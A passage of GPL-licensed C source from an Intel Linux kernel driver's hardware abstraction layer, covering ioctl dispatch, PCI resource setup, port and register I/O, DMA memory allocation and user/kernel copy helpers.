    IN NAL_LINUX_ISR_DEVICE* NalIsrDevice
    )
{
    BOOLEAN InterruptOccurred = FALSE;

    if(NalIsrDevice != NULL && NalIsrDevice->Signature == NAL_LINUX_INTERRUPT_SIGNATURE)
    {
        InterruptOccurred = NalIsrDevice->DeviceInterrupted;
    }

    return InterruptOccurred;
}

BOOLEAN
_NalCheckAndClearAdapterInterrupt(
    IN NAL_MAC_TYPE MacType,
    IN KVOID* BaseAddress
    )
{
    return FALSE;
}

NAL_STATUS
NalResolveOsSpecificIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    )
{
    NAL_STATUS NalStatus = NAL_INVALID_PARAMETER;

    if(NalIoctl != NULL)
    {
        switch(NalIoctl->FunctionId)
        {
           case NAL_LINUX_ADAPTER_IN_USE_FUNCID:
                {
                    NAL_LINUX_ADAPTER_IN_USE_FUNC* FunctionData =
                        (NAL_LINUX_ADAPTER_IN_USE_FUNC*)(&(NalIoctl->InputBuffer));

                    printk(KERN_DEBUG "calling ioctl In mark adapter lock \n");
                    if(FunctionData != NULL)
                    {
                        FunctionData->CanBeUsed = _NalMarkAdapterInUse(FunctionData->NalDevice,
                                                                       FunctionData->Locked);
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                        NalDebugPrint("NalResolveOsSpecificIoctl: NAL_LINUX_ADAPTER_IN_USE_FUNCID FunctionData is NULL\n");
                    }
                }
                break;

           case NAL_LINUX_IS_ADAPTER_IN_USE_FUNCID:
                {
                    NAL_LINUX_IS_ADAPTER_IN_USE_FUNC* FunctionData =
                        (NAL_LINUX_IS_ADAPTER_IN_USE_FUNC*)(&(NalIoctl->InputBuffer));

                    if(FunctionData != NULL)
                    {
                        FunctionData->IsInUse = _NalIsAdapterInUse(FunctionData->NalDevice);
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                        NalDebugPrint("NalResolveOsSpecificIoctl: NAL_LINUX_IS_ADAPTER_IN_USE_FUNCID FunctionData is NULL\n");
                    }
                }
                break;

            case NAL_LINUX_REQUEST_REGIONS_FUNCID:
                {
                    NAL_LINUX_DEVICERESOURCE_FUNC* FunctionData =
                        (NAL_LINUX_DEVICERESOURCE_FUNC*)(&(NalIoctl->InputBuffer));

                    if(FunctionData != NULL)
                    {
                        FunctionData->ReturnValue = _NalEnableDevice(FunctionData->DeviceLocation,
                                                                     &(FunctionData->NalIoResource[0]),
                                                                     &FunctionData->Pdev);
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                        NalDebugPrint("NalResolveOsSpecificIoctl: NAL_LINUX_REQUEST_REGIONS_FUNCID FunctionData is NULL\n");
                    }
                }
                break;

            case NAL_LINUX_RELEASE_REGIONS_FUNCID:
                {
                    NAL_LINUX_DEVICERESOURCE_FUNC* FunctionData =
                        (NAL_LINUX_DEVICERESOURCE_FUNC*)(&(NalIoctl->InputBuffer));
                    NalDebugPrint("NalResolveOsSpecificIoctl: NAL_LINUX_RELEASE_REGIONS_FUNCID FunctionData is NULL\n");

                    if(FunctionData != NULL)
                    {
                        FunctionData->ReturnValue = _NalReleaseRegions(FunctionData->Pdev);
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                        NalDebugPrint("NalResolveOsSpecificIoctl: NAL_LINUX_RELEASE_REGIONS_FUNCID FunctionData is NULL\n");
                    }
                }
                break;

            case NAL_LINUX_INC_DRIVER_REFCOUNT_FUNCID:
                {
                    _NalDriverIncrementReferenceCount();
                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_LINUX_DEC_DRIVER_REFCOUNT_FUNCID:
                {
                    _NalDriverDecrementReferenceCount();
                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_LINUX_GET_DRIVER_REFCOUNT_FUNCID:
                {
                    NAL_LINUX_REFCOUNT_FUNCS* FunctionData =
                        (NAL_LINUX_REFCOUNT_FUNCS*)(&(NalIoctl->InputBuffer));

                    if(FunctionData != NULL)
                    {
                        FunctionData->ReturnValue = _NalDriverGetReferenceCount();
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                    }
                }
                break;

            case NAL_LINUX_DRIVER_GET_VERSION:
                {
                    NAL_LINUX_DRIVER_GET_VERSION_FUNCS* FunctionData =
                        (NAL_LINUX_DRIVER_GET_VERSION_FUNCS*)(&(NalIoctl->InputBuffer));

                   NalDebugPrint("NalResolveOsSpecificIoctl: Nal get version Ioctl\n");

                    if(FunctionData != NULL)
                    {
                        _NalDriverGetVersion(FunctionData->Version);
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                    }
                }
                break;

            case NAL_LINUX_FILL_DEVICE_RESOURCE_FUNCID:
                {
                    NAL_LINUX_DEVICERESOURCE_FUNC* FunctionData =
                        (NAL_LINUX_DEVICERESOURCE_FUNC*)(&(NalIoctl->InputBuffer));

                    NalDebugPrint("NalResolveOsSpecificIoctl: Nal Fill device resource Ioctl\n");

                    if(FunctionData != NULL)
                    {
                        FunctionData->ReturnValue = _NalFillDeviceResource(FunctionData->DeviceLocation,
                                                                           &(FunctionData->NalIoResource[0]),
                                                                           &FunctionData->Pdev);
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                        NalDebugPrint("NalResolveOsSpecificIoctl: NAL_LINUX_FILL_DEVICE_RESOURCE_FUNCID FunctionData is NULL\n");
                    }
                }
                break;

            case NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNCID:
                {
                    NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC* FunctionData =
                        (NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC*)(&(NalIoctl->InputBuffer));

                        NalFreeMemoryNonPagedPci(FunctionData->PDev,
                                               FunctionData->Address,
                                               FunctionData->PhysicalAddress,
                                               FunctionData->Size);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNCID:
                {
                    NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC* FunctionData =
                        (NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC*)(&(NalIoctl->InputBuffer));

                        FunctionData->ReturnValue =
                            _NalAllocateMemoryNonPagedPci(FunctionData->PDev,
                                                       FunctionData->ByteCount,
                                                       FunctionData->Alignment,
                                                       &FunctionData->PhysicalAddress,
                                                       NULL,
                                                       0);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_LINUX_READPCIEXBYTE_FUNCID:
                {
                    NAL_LINUX_READPCIEXBYTE_FUNC* FunctionData =
                        (NAL_LINUX_READPCIEXBYTE_FUNC*)(&(NalIoctl->InputBuffer));

                    FunctionData->ReturnValue =
                        _NalOsReadPciExByte(FunctionData->PciLocation,
                                                   FunctionData->ByteIndex,
                                                   &FunctionData->Value);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_LINUX_WRITEPCIEXBYTE_FUNCID:
                {
                    NAL_LINUX_WRITEPCIEXBYTE_FUNC* FunctionData =
                        (NAL_LINUX_WRITEPCIEXBYTE_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalOsWritePciExByte(FunctionData->PciLocation,
                                                    FunctionData->ByteIndex,
                                                    FunctionData->Value);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_LINUX_GET_RUN_DOMAIN_FUNCID:
                {
                    NAL_LINUX_RUN_DOMAIN_FUNC* FunctionData =
                        (NAL_LINUX_RUN_DOMAIN_FUNC*)(&(NalIoctl->InputBuffer));

                    printk(KERN_DEBUG "calling ioctl get run domain\n");
                    if(FunctionData != NULL)
                    {
                        FunctionData->RunDomain = _NalGetOsRunDomain();
                        FunctionData->ReturnValue = NAL_SUCCESS;
                        NalStatus = NAL_SUCCESS;
                    }
                    else
                    {
                        NalStatus = NAL_INVALID_PARAMETER;
                        NalDebugPrint("NalResolveOsSpecificIoctl: NAL_LINUX_GET_RUN_DOMAIN_FUNCID FunctionData is NULL\n");
                    }
                }
                break;

           default:
                NalStatus = NAL_IOCTL_INVALID_FUNCTION_ID;
                break;
        }
    }

    return NalStatus;
}

NAL_STATUS
_NalEnableDevice(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    OUT NAL_IO_RESOURCE* IoResource,
    OUT KVOID** PDev
    )
{
    struct pci_dev* PciDevice = NULL;
    struct pci_bus* LinuxPciBus = NULL;
    NAL_STATUS NalStatus = NAL_SUCCESS;
    UINT32 i = 0;
    unsigned int DeviceFunction = 0;
    int Result = 0;

    DeviceFunction = PCI_DEVFN(DeviceLocation.Pci.Device, DeviceLocation.Pci.Function);

    do
    {

        LinuxPciBus = pci_find_bus(DeviceLocation.Pci.Segment, DeviceLocation.Pci.Bus);
        if(LinuxPciBus == NULL)
        {
            NalStatus = NAL_PCICONFIG_NOT_AVAILABLE;
            break;
        }

        PciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);
        if(PciDevice == NULL)
        {
            NalStatus = NAL_PCICONFIG_NOT_AVAILABLE;
            break;
        }

        Result = pci_enable_device(PciDevice);
        if(Result != 0)
        {
            NalStatus = NAL_PCICONFIG_NOT_AVAILABLE;
            break;
        }

        if (pci_set_dma_mask(PciDevice, DMA_BIT_MASK(64)) ||
            pci_set_consistent_dma_mask(PciDevice, DMA_BIT_MASK(64)))
        {
            if (pci_set_dma_mask(PciDevice, DMA_BIT_MASK(32)) ||
                pci_set_consistent_dma_mask(PciDevice, DMA_BIT_MASK(32)))
            {
                    printk(KERN_DEBUG "No usable DMA configuration, aborting\n");
                    NalStatus = NAL_DMA_NOT_SUPPORTED;
                    break;
            }
        }

        for(i=0; i<6; i++)
        {

            if(pci_resource_len(PciDevice, i) == 0)
            {
                continue;
            }

            if(pci_resource_flags(PciDevice, i) & IORESOURCE_IO)
            {
                request_region(pci_resource_start(PciDevice, i),
                               pci_resource_len(PciDevice, i),
                               NAL_LINUX_DRIVER_NAME);
                IoResource[i].MemoryAddress = pci_resource_start(PciDevice, i);
                IoResource[i].Type = NAL_IO_TYPE_IO;
            }
            else if(pci_resource_flags(PciDevice, i) & IORESOURCE_MEM)
            {
                if(!check_mem_region(pci_resource_start(PciDevice, i), pci_resource_len(PciDevice, i)))
                {
                    request_mem_region(pci_resource_start(PciDevice, i),
                                       pci_resource_len(PciDevice, i),
                                       NAL_LINUX_DRIVER_NAME);
                    IoResource[i].MemoryAddress = pci_resource_start(PciDevice, i);
                }
                else
                {
                    IoResource[i].MemoryAddress = 0;
                }
                IoResource[i].Type = NAL_IO_TYPE_MEM;
            }
        }

        pci_set_master(PciDevice);

        *PDev = PciDevice;
    } while(0);

    return NalStatus;
}

NAL_STATUS
_NalFillDeviceResource(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    OUT NAL_IO_RESOURCE* IoResource,
    OUT KVOID** PDev
    )
{
    struct pci_dev* PciDevice = NULL;
    struct pci_bus* LinuxPciBus = NULL;
    NAL_STATUS NalStatus = NAL_SUCCESS;
    UINT32 i = 0;
    unsigned int DeviceFunction = 0;

    printk(KERN_DEBUG "In Nal Fill Device resource\n");

    DeviceFunction = PCI_DEVFN(DeviceLocation.Pci.Device, DeviceLocation.Pci.Function);

    do
    {

        LinuxPciBus = pci_find_bus(DeviceLocation.Pci.Segment, DeviceLocation.Pci.Bus);
        if(LinuxPciBus == NULL)
        {
            NalStatus = NAL_PCICONFIG_NOT_AVAILABLE;
            break;
        }

        PciDevice = pci_get_slot(LinuxPciBus, DeviceFunction);
        if(PciDevice == NULL)
        {
            NalStatus = NAL_PCICONFIG_NOT_AVAILABLE;
            break;
        }

        if (!pci_dma_supported(PciDevice, DMA_BIT_MASK(64)))
        {
            if (!pci_dma_supported(PciDevice, DMA_BIT_MASK(32)))
            {
                printk(KERN_DEBUG "No usable DMA configuration, aborting\n");
                NalStatus = NAL_DMA_NOT_SUPPORTED;
                break;
            }
        }

        for(i=0; i<6; i++)
        {

            if(pci_resource_len(PciDevice, i) == 0)
            {
                continue;
            }

            if(pci_resource_flags(PciDevice, i) & IORESOURCE_IO)
            {
                IoResource[i].MemoryAddress = pci_resource_start(PciDevice, i);
                IoResource[i].Type = NAL_IO_TYPE_IO;
            }
            else if(pci_resource_flags(PciDevice, i) & IORESOURCE_MEM)
            {
                if(!check_mem_region(pci_resource_start(PciDevice, i), pci_resource_len(PciDevice, i)))
                {
                    IoResource[i].MemoryAddress = 0;
                }
                else
                {
                    IoResource[i].MemoryAddress = pci_resource_start(PciDevice, i);
                }
                IoResource[i].Type = NAL_IO_TYPE_MEM;
            }
        }

        *PDev = PciDevice;
    }while(0);

    return NalStatus;
}

NAL_STATUS
_NalReleaseRegions(
    IN KVOID* PDev
    )
{
    struct pci_dev* PciDevice = (struct pci_dev*)PDev;
    NAL_STATUS NalStatus = NAL_SUCCESS;
    UINT32 i = 0;

    for(i=0; i<6; i++)
    {

        if(pci_resource_len(PciDevice, i) == 0)
        {
            continue;
        }

        if(pci_resource_flags(PciDevice, i) & IORESOURCE_IO)
        {
            release_region(pci_resource_start(PciDevice, i),
                           pci_resource_len(PciDevice, i));
        }
        else if(pci_resource_flags(PciDevice, i) & IORESOURCE_MEM)
        {
            release_mem_region(pci_resource_start(PciDevice, i),
                               pci_resource_len(PciDevice, i));
        }
    }
    pci_dev_put(PciDevice);
    pci_disable_device(PciDevice);

    return NalStatus;
}

NAL_OS_RUN_DOMAIN
_NalGetOsRunDomain()
{
    NAL_OS_RUN_DOMAIN Domain = NAL_OS_DOMAIN_BAREMETAL;

#ifdef is_running_on_xen
    if(is_running_on_xen())
    {
        if(is_initial_xendomain())
        {
            Domain = NAL_OS_DOMAIN_0;
        }
        else
        {
            Domain = NAL_OS_DOMAIN_U;
        }
    }
#endif

    return Domain;
}

```

`source/IntelNal/src/linuxdriveros_i.c`:

```c
/*
 * Intel QV Linux kernel driver
 * Copyright (c) 1999 - 2013, Intel Corporation.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms and conditions of the GNU General Public License,
 * version 2, as published by the Free Software Foundation.
 *
 * This program is distributed in the hope it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
 *
 */

/*
 * Module Name:
 *   linuxdriveros_i.c
 *
 * Abstract:
 *   This is the driver OSI portion of NAL Linux.  These same
 *   function implementations will appear in Linuxlibrary.c. This file
 *   provides the necessary means to call the IOCTL needed and returns
 *   the correct values for the OS Interface of the NAL for Linux.
 */


#include "nalcodes.h"
#include "naltypes.h"
#include "os_i.h"
#include "pci_i.h"
#include "linuxnaldriver.h"

#include <asm/io.h>
#include <asm/mman.h>
#include <linux/slab.h>
#include <asm/atomic.h>
#include <linux/sched.h>
#include <asm/page.h>

#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/pci_ids.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <asm/uaccess.h>
#include <linux/pci.h>
#include <linux/delay.h>

spinlock_t Global_AtomicTestSetSpinLock;

#if 0
BOOLEAN Global_DebugPrintEnabled = TRUE;
#else
BOOLEAN Global_DebugPrintEnabled = FALSE;
#endif

extern NAL_PHYSICAL_ADDRESS Global_SpiBaseRegPhysicalAddress;

UINT8
NalReadPort8(
    IN PORT_ADDR Port
    )
{
    UINT8 Buffer = 0;
    Buffer = inb(Port);
    return Buffer;
}

UINT16
NalReadPort16(
    IN PORT_ADDR Port
    )
{
    UINT16 Buffer = 0;

    Buffer = inw(Port);
    return Buffer;
}

UINT32
NalReadPort32(
    IN PORT_ADDR Port
    )
{
    UINT32 Buffer = 0;
    Buffer = inl(Port);
    return Buffer;
}

BOOLEAN
NalWritePort8(
    IN PORT_ADDR Port,
    IN UINT8 Value
    )
{
    outb(Value, Port);
    return TRUE;
}

BOOLEAN
NalWritePort16(
    IN PORT_ADDR Port,
    IN UINT16 Value
    )
{
    outw(Value, Port);
    return TRUE;
}

BOOLEAN
NalWritePort32(
    IN PORT_ADDR Port,
    IN UINT32 Value
    )
{
    outl(Value, Port);
    return TRUE;
}

UINT8
NalReadRegister8(
    IN KVOID* Address
    )
{
    UINT8 Value = 0;

    if(Address != NULL)
    {
        Value = readb((CHAR*)Address);
    }
    return Value;
}

UINT16
NalReadRegister16(
    IN KVOID* Address
    )
{
    UINT16 Value = 0;

    if(Address != NULL)
    {
        Value = readw((CHAR*)Address);
    }
    return Value;
}

UINT32
NalReadRegister32(
    IN KVOID* Address
    )
{
    UINT32 Value = 0;

    if(Address != NULL)
    {
        Value = readl((CHAR*)Address);
    }
    return Value;
}

BOOLEAN
NalWriteRegister8(
    IN KVOID* Address,
    IN UINT8 Value
    )
{
    BOOLEAN Success = FALSE;

    if(Address != NULL)
    {
        writeb(Value, (CHAR*)Address);
        Success = TRUE;
    }
    return Success;
}

BOOLEAN
NalWriteRegister16(
    IN KVOID* Address,
    IN UINT16 Value
    )
{
    BOOLEAN Success = FALSE;

    if(Address != NULL)
    {
        writew(Value, (CHAR*)Address);
        Success = TRUE;
    }
    return Success;
}

BOOLEAN
NalWriteRegister32(
    IN KVOID* Address,
    IN UINT32 Value
    )
{
    BOOLEAN Success = FALSE;

    if(Address != NULL)
    {
        writel(Value, (CHAR*)Address);
        Success = TRUE;
    }
    return Success;
}

NAL_STATUS
NalMmapAddress(
    IN OUT KVOID** VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN OUT UINT32* Length
    )
{
    NAL_STATUS NalStatus = NAL_INVALID_PARAMETER;

    if(_NalIsBytPciDevices(PhysicalAddress) != TRUE) {
	NalDebugPrint("PhysicalAddress : %x is not supported by Android driver", PhysicalAddress);
        return NAL_MMAP_FAILED;
    }

    if(VirtualAddress != NULL && Length != NULL)
    {
        *VirtualAddress = ioremap(PhysicalAddress, (UINT64)(*Length));
        if(*VirtualAddress != NULL)
        {
            NalStatus = NAL_SUCCESS;
        }
        else
        {
            NalStatus = NAL_MMAP_FAILED;
        }
    }
    return NalStatus;
}

NAL_STATUS
NalUnmapAddress(
    IN KVOID* VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN UINT32 Length
    )
{
    NAL_STATUS NalStatus = NAL_INVALID_PARAMETER;
    if(VirtualAddress != NULL)
    {
        iounmap(VirtualAddress);
        NalStatus = NAL_SUCCESS;
    }
    return NalStatus;
}

VOID
NalDelayMilliseconds(
    IN UINT32 Milliseconds
    )
{
    mdelay(Milliseconds);
}

VOID
NalDelayMicroseconds(
    IN UINT32 Microseconds
    )
{

    if(Microseconds>1000)
    {
        NalDelayMilliseconds((UINT32)(Microseconds/1000));
        Microseconds %= 1000;
    }
    udelay(Microseconds);
}

UINT64
NalGetTimeStamp( VOID )
{
    UINT32 Low = 0;
    UINT32 High = 0;

    return (UINT64)((((UINT64)High) << 32) | Low);
}

UINT64
NalGetTimeStampsPerMicrosecond( VOID )
{
    return (UINT64)0;
}

VOID*
_NalAllocateMemory(
    IN UINT32 ByteCount,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    )
{
    VOID* Address = kmalloc(ByteCount, GFP_KERNEL);
    if(Address != NULL)
    {
        memset(Address, 0, ByteCount);
    }
    return Address;
}

KVOID*
_NalAllocateMemoryNonPaged(
    IN UINT32 ByteCount,
    IN UINT32 Alignment,
    OUT NAL_PHYSICAL_ADDRESS* PhysicalAddress,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    )
{
    KVOID* Allocation = NULL;

    NalDebugPrint("PAGE_SIZE = %d\n", PAGE_SIZE);
    if(ByteCount < Alignment)
    {
        NAL_LINUX_MEMORY_ROUNDUP(ByteCount, Alignment);
        NalDebugPrint("Aligned bytecount = %d\n", ByteCount);
    }

    if(ByteCount <= (128 * 1024))
    {
        Allocation = kmalloc(ByteCount, GFP_KERNEL | GFP_DMA);

        if(Allocation != NULL && PhysicalAddress != NULL)
        {
            *PhysicalAddress = (NAL_PHYSICAL_ADDRESS)__pa(Allocation);
        }
    }

    if(Allocation == NULL)
    {
        NalDebugPrint("Allocation failed: File: %s, Line %d\n", NamedLocator, LineNumber);
    }
    else
    {
        memset(Allocation, 0, ByteCount);
        if(PhysicalAddress != NULL)
        {
            NalDebugPrint("Phys Addr: %x", *PhysicalAddress);
        }
        NalDebugPrint("\n");
    }
    return Allocation;
}

KVOID*
_NalAllocateMemoryNonPagedPci(
    IN KVOID* PDev,
    IN UINT32 ByteCount,
    IN UINT32 Alignment,
    OUT NAL_PHYSICAL_ADDRESS* PhysicalAddress,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    )
{
    KVOID* Allocation = NULL;
    struct pci_dev* LinuxPciDevice = (struct pci_dev*)PDev;
    dma_addr_t Dma;

    NalDebugPrint("PAGE_SIZE = %d\n", PAGE_SIZE);
    if(ByteCount < Alignment)
    {
        NAL_LINUX_MEMORY_ROUNDUP(ByteCount, Alignment);
        NalDebugPrint("Aligned bytecount = %d\n", ByteCount);
    }

    if((LinuxPciDevice != NULL) && ByteCount <= NAL_LINUX_MAX_CONTIGUOUS_MEMORY_ALLOCATION)
    {

        Allocation = pci_alloc_consistent(LinuxPciDevice,ByteCount, &Dma);
        *PhysicalAddress = (NAL_PHYSICAL_ADDRESS)Dma;
    }

    if(Allocation == NULL)
    {
        NalDebugPrint("Allocation failed: File: %s, Line %d\n", NamedLocator, LineNumber);
    }
    else
    {
        memset(Allocation, 0, ByteCount);
        if(PhysicalAddress != NULL)
        {
            NalDebugPrint("Phys Addr: %x", *PhysicalAddress);
        }
        NalDebugPrint("\n");
    }
    return Allocation;
}

VOID
_NalFreeMemory(
    IN VOID* Address,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    )
{
    if(Address != NULL)
    {
        kfree(Address);
    }
}

VOID
_NalFreeMemoryNonPaged(
    IN KVOID* Address,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    )
{
    if(Address != NULL)
    {

        kfree(Address);
    }
}

VOID
NalFreeMemoryNonPagedPci(
    IN KVOID* PDev,
    IN KVOID* Address,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN UINT32 Size
    )
{
    struct pci_dev* LinuxPciDevice = (struct pci_dev*)PDev;

    if(PDev != NULL && Address != NULL && PhysicalAddress != 0)
    {
        printk(KERN_DEBUG "freeing memory with size %d and phy address %x'%x\n", Size, HIDWORD((UINT64)PhysicalAddress), LODWORD((UINT64)PhysicalAddress));
        pci_free_consistent(LinuxPciDevice, Size, Address, PhysicalAddress);
    }
}

NAL_PHYSICAL_ADDRESS
NalGetPhysicalMemoryAddress(
    IN KVOID* VirtualAddress
    )
{
    NAL_PHYSICAL_ADDRESS NalPhysical = 0;

    if(VirtualAddress != NULL)
    {
        NalPhysical = __pa(VirtualAddress);
    }

    return NalPhysical;
}

KVOID*
NalKMemset(
    IN KVOID* Dest,
    IN int Value,
    IN UINTN Size
    )
{
    return memset(Dest, Value, Size);
}

VOID*
NalKtoUMemcpy(
    IN VOID* Dest,
    IN KVOID* Source,
    IN UINTN Size
    )
{
    UINTN BytesLeft = 0;
    BytesLeft = copy_to_user(Dest, Source, Size);
    return Dest;
}

KVOID*
NalKtoKMemcpy(
    IN KVOID* Dest,
    IN KVOID* Source,
    IN UINTN Size
    )
{
    return memcpy(Dest, Source, Size);
}

KVOID*
NalUtoKMemcpy(
    IN KVOID* Dest,
    IN VOID* Source,
    IN UINTN Size
    )
{
    UINTN BytesLeft = 0;
    NAL_PHYSICAL_ADDRESS NalPhysical = 0;

    if(Dest != NULL) {
        if(_NalIsBytMfgModeDoneSet() == TRUE) {
            NalPhysical = __pa(Dest);
            if(NalPhysical >= (Global_SpiBaseRegPhysicalAddress + SPI_FDATA0_OFFSET)
               && NalPhysical <= (Global_SpiBaseRegPhysicalAddress + SPI_FDATA15_OFFSET)) {
                printk(KERN_DEBUG "MFG mode is set cannot write to SPI after MFG mode is set\n");
	        return NULL;
            }
        }
        BytesLeft = copy_from_user(Dest, Source, Size);
    }
    return Dest;
}

UINT32
NalAtomicIncrement32(
    IN UINT32* Address
    )
{
    UINT32 ReturnValue = 0;
    UINT32 AddressLocal = 0;
    UINTN BytesLeft = 0;

    if(Address != NULL)
    {

        spin_lock(&Global_AtomicTestSetSpinLock);
        BytesLeft = copy_from_user((void*)(&AddressLocal), (void*)Address, sizeof(UINT32));

        AddressLocal++;

        ReturnValue = AddressLocal;

        BytesLeft = copy_to_user((void*)Address, (void*)(&AddressLocal), sizeof(UINT32));

        spin_unlock(&Global_AtomicTestSetSpinLock);
    }
    return ReturnValue;
}

UINT32
NalAtomicDecrement32(
    IN UINT32* Address
    )
{
    UINT32 ReturnValue = 0;
    UINT32 AddressLocal = 0;
    UINTN BytesLeft = 0;

    if(Address != NULL)
    {

        spin_lock(&Global_AtomicTestSetSpinLock);
        BytesLeft = copy_from_user((void*)(&AddressLocal), (void*)Address, sizeof(UINT32));

        AddressLocal--;

        ReturnValue = AddressLocal;

        BytesLeft = copy_to_user((void*)Address, (void*)(&AddressLocal), sizeof(UINT32));

        spin_unlock(&Global_AtomicTestSetSpinLock);
    }

    return ReturnValue;
}

UINT32
NalAtomicTestSet32(
    IN UINT32* Address,
    IN UINT32 Test,
    IN UINT32 Set
    )
{
    UINT32 ReturnValue = 0;
    UINT32 AddressLocal = 0;
    UINTN BytesLeft = 0;

    if(Address != NULL)
    {

        spin_lock(&Global_AtomicTestSetSpinLock);
        BytesLeft = copy_from_user((void*)(&AddressLocal), (void*)Address, sizeof(UINT32));

        ReturnValue = AddressLocal;

        if(AddressLocal == Test)
        {
            AddressLocal = Set;
        }

        BytesLeft = copy_to_user((void*)Address, (void*)(&AddressLocal), sizeof(UINT32));

        spin_unlock(&Global_AtomicTestSetSpinLock);
    }

    return ReturnValue;
}

NAL_STATUS
NalDebugPrintSupport(
    OUT UINT32* DebugCapabilities
    )
{
    if (DebugCapabilities != NULL)
    {
        *DebugCapabilities = NAL_DEBUG_PRINT_SUPPORTED |
                             NAL_DEBUG_PRINT_FILEIO;
    }

    return NAL_SUCCESS;
}

NAL_STATUS
NalDebugPrint(
    IN CHAR* Format,
    ...
    )
{
    CHAR FormattedStatus[500];
    va_list ArgPtr;
    NAL_STATUS DbgPrintStatus = NAL_DEBUGPRINT_FAILED;

    if(Global_DebugPrintEnabled == TRUE)
    {

        va_start(ArgPtr, Format);
        vsprintf(FormattedStatus, Format, ArgPtr);
        va_end(ArgPtr);

        printk(KERN_DEBUG "%s", FormattedStatus);
        DbgPrintStatus = NAL_SUCCESS;
    }
    return DbgPrintStatus;
}

VOID
NalEnableDebugPrint(
    IN BOOLEAN Enable
    )
{
    Global_DebugPrintEnabled = Enable;
}

NAL_STATUS
NalMmapAddressEx(
    IN OUT KVOID** VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN OUT UINT32* Length,
    IN UINTN ProcessId
    )
{
    return NalMmapAddress(VirtualAddress, PhysicalAddress, Length);
}

NAL_STATUS
NalUnmapAddressEx(
    IN KVOID* VirtualAddress,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN UINT32 Length,
    IN UINTN ProcessId
    )
{
    return NalUnmapAddress(VirtualAddress, PhysicalAddress, Length);
}

KVOID*
_NalAllocateMemoryNonPagedEx(
    IN UINT32 ByteCount,
    IN UINT32 Alignment,
    IN UINTN ProcessId,
    OUT NAL_PHYSICAL_ADDRESS* PhysicalAddress,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    )
{
    return _NalAllocateMemoryNonPaged(ByteCount, Alignment, PhysicalAddress, NamedLocator, LineNumber);
}

VOID
_NalFreeMemoryNonPagedEx(
    IN KVOID* Address,
    IN UINTN ProcessId,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    )
{
    return _NalFreeMemoryNonPaged(Address, NamedLocator, LineNumber);
}

NAL_PHYSICAL_ADDRESS
NalGetPhysicalMemoryAddressEx(
    IN KVOID* VirtualAddress,
    IN UINTN ProcessId
    )
{
    return NalGetPhysicalMemoryAddress(VirtualAddress);
}

```

`source/IntelNal/src/linuxdriverpci_i.c`:

```c
/*
 * Intel QV Linux kernel driver
 * Copyright (c) 1999 - 2013, Intel Corporation.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms and conditions of the GNU General Public License,
 * version 2, as published by the Free Software Foundation.
 *
 * This program is distributed in the hope it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
 *
 */

/*
 *  Module Name:
 *    linuxdriverpci_i.c
 *
 *  Abstract:
 *    This file contains function implementations for NAL PCI
 *    functions for the Linux Driver portion.  These routines
 *    are called as IOCTL's from the NalResolveIoctl routines.
 *
 */


#include <nalcodes.h>
#include <naltypes.h>
#include <os_i.h>
#include <hwbus_t.h>
#include <pci_i.h>
#include "linuxnaldriver.h"
#include <linux/module.h>
#include <linux/pci.h>
#include <asm/byteorder.h>

#ifndef CONFIG_PCI
#error "This driver requires PCI support to be available"
